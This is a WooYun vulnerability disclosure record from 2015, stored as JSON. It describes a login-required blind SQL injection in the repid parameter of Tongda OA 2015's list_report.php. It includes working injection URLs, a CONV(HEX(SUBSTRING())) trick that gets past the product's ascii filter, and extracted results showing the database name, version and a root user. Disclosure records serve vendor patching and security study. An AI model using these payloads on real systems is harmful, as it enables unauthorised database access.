{"id": 83455, "wybug_id": "wooyun-2015-0147785", "wybug_title": "通达OA Office Anywhere 2015版网络智能办公系统一处盲注漏洞/demo测试（需登录）", "wybug_corp": "通达信科", "wybug_author": "路人甲", "wybug_date": "2015-11-04 11:55", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 最新版，绕过过滤，直接注 详细说明：  厂商：通达信科测试demo地址：**.**.**.**/从官网（http://**.**.**.**/）直接点击集团版在线试用进去以后，注入出在：list_report.php文件中\n注入地址：**.**.**.**/general/data_center/model_design/design/report/list_report.php?repid=1&openmode=design&menu_id=1参数repid可注入\n直接在repid参数后加入一个a，直接把SQL爆出来了\n错误，请联系管理员 SQL语句: select * from crs_report where id in (1a) order by orderno, repno文件：/general/data_center/model_design/design/report/list_report.php管理模板 - 未指定类型 错误，请联系管理员 SQL语句: select * from crs_report where id in (1a) order by orderno, repno文件：/general/data_center/model_design/design/report/list_report.php\n\n\n下面是注入难点：\n通过观察需要构造闭合括号，然后采用报错注入，上去执行发现（1）凡是SQL执行出错的情况，程序都会输出出错的SQL；（2）带有危险函数时，均被过滤****这个最不好绕过（3）不能带有注释（4）不能union查询\n过滤了注释符：\n\n报错注入执行不了\n\n不能union\n\n只能是盲注了。。。( ▼-▼ )下面就是构造注入执行如下语句，通过！\n**.**.**.**/general/data_center/model_design/design/report/list_report.php?repid=1)and(1=1&openmode=design&menu_id=1 盲注构造：)and(1=1\n\n\n可是问题又来了，危险函数均被过滤了。。。只能有一些特别基本的SQL。。。\n**.**.**.**/general/data_center/model_design/design/report/list_report.php?repid=1)and ascii(a)=97 and(1=1&openmode=design&menu_id=1\nascii都被过滤了。。。\n\n其次hex也无法单独去跑，因为涉及字符串，引号就不好过了想法设法绕过，最后经过一段时间折腾终于有一个payload可以通过，(●'◡'●)套3层函数，实现ascii函数功能，终于绕过。exp如下\n**.**.**.**/general/data_center/model_design/design/report/list_report.php?repid=1)and CONV(HEX(SUBSTRING(database(),1,1)),16,10)=116 and(1=1&openmode=design&menu_id=1\n\n\n下面就写脚本开始注\n\n跑出database：\ntd_oa\n\n\n跑出version，字段长度好长啊，但是还不确定：\n5.5.36-enterprise-commercial-advanced-log\n\n\n继续跑出user：\nroot@**.**.**.**\n还是root权限   漏洞证明：  \n\n\n\n\n\n   修复方案：  再次过滤别把出错SQL展示给用户，不然我也不知道怎么构造。。。(￣▽￣)\"   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-11-04 12:02 厂商回复： 需要登录 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}